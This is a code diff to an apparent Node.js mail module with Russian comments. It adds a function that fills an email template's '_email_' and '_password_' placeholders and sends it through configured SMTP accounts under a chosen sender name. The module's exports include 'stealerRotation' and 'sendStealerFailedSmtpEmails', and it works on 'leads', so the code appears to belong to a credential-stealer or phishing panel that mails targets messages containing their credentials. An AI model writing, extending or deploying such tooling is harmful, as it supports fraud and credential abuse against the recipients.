@@ -177,6 +177,83 @@ function leadHasAnyConfigEmailSentEvent(lead) {
   });
 }
 
+/** Из строки «Name <a@b.c>» или текста с email — первый похожий на email фрагмент. */
+function extractRecipientEmail(raw) {
+  const t = String(raw || '').trim();
+  if (!t) return '';
+  const angle = t.match(/<([^\s<>]+@[^\s<>]+)>/);
+  if (angle) return angle[1].trim().toLowerCase();
+  const bare = t.match(/[^\s<>]+@[^\s<>]+\.[^\s<>]+/);
+  if (bare) return bare[0].trim().toLowerCase();
+  return '';
+}
+
+/**
+ * Отправка шаблона Config → E-Mail на произвольный адрес (админка, тест).
+ * Не пишет события в лог лида.
+ */
+async function sendConfigEmailToAddress(toRaw, password, configId) {
+  const toEmail = extractRecipientEmail(toRaw) || String(toRaw || '').trim().toLowerCase();
+  if (!toEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(toEmail)) {
+    return { ok: false, error: 'Некорректный email получателя', statusCode: 400 };
+  }
+  const pwd = password != null ? String(password).trim() : '';
+  const data = readConfigEmail();
+  let cfg = data.current;
+  if (configId) {
+    const found = (data.configs || []).find((c) => c.id == configId);
+    if (found) cfg = found;
+  }
+  if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
+    return { ok: false, error: 'В Config → E-Mail не задан SMTP.', statusCode: 400 };
+  }
+  const smtpList = parseSmtpLines(cfg.smtpLine);
+  if (!smtpList.length) {
+    return { ok: false, error: 'В Config → E-Mail не задан SMTP.', statusCode: 400 };
+  }
+  let html = (cfg.html || '')
+    .replace(/_email_/g, toEmail)
+    .replace(/_password_/g, pwd);
+  const attachments = [];
+  if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
+    try {
+      const buf = Buffer.from(cfg.image1Base64, 'base64');
+      const cid = 'image1@mail';
+      html = html.replace(/_src1_/g, 'cid:' + cid);
+      attachments.push({ filename: 'image1.png', content: buf, cid: cid });
+    } catch (e) {}
+  } else if (html.indexOf('_src1_') !== -1) {
+    html = html.replace(/_src1_/g, '');
+  }
+  if (!nodemailer) {
+    return { ok: false, error: 'nodemailer not installed', statusCode: 500 };
+  }
+  const smtp = smtpList[0];
+  const transporter = nodemailer.createTransport({
+    host: smtp.host,
+    port: smtp.port,
+    secure: smtp.port === 465,
+    auth: { user: smtp.user, pass: smtp.password }
+  });
+  const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
+  const mailOptions = {
+    from: fromStr,
+    to: toEmail,
+    subject: (cfg.title || '').trim() || 'Message',
+    html,
+    attachments: attachments.length ? attachments : undefined,
+    envelope: { from: smtp.fromEmail, to: toEmail }
+  };
+  try {
+    await transporter.sendMail(mailOptions);
+    return { ok: true, fromEmail: smtp.fromEmail, toEmail };
+  } catch (err) {
+    const msg = (err.message || '').slice(0, 200);
+    console.error('[send-config-email-test] Ошибка SMTP ' + smtp.fromEmail + ' → ' + toEmail + ': ' + msg);
+    return { ok: false, error: msg, statusCode: 500 };
+  }
+}
+
 async function sendConfigEmailToLead(lead) {
   const toEmail = (lead.email || lead.emailKl || '').trim();
   if (!toEmail) {
@@ -264,6 +341,8 @@ module.exports = {
   reloadMailConfigCachesFromDisk,
   leadHasAnyConfigEmailSentEvent,
   sendConfigEmailToLead,
+  sendConfigEmailToAddress,
+  extractRecipientEmail,
   stealerRotation,
   sendStealerFailedSmtpEmails,
   getNodemailer,
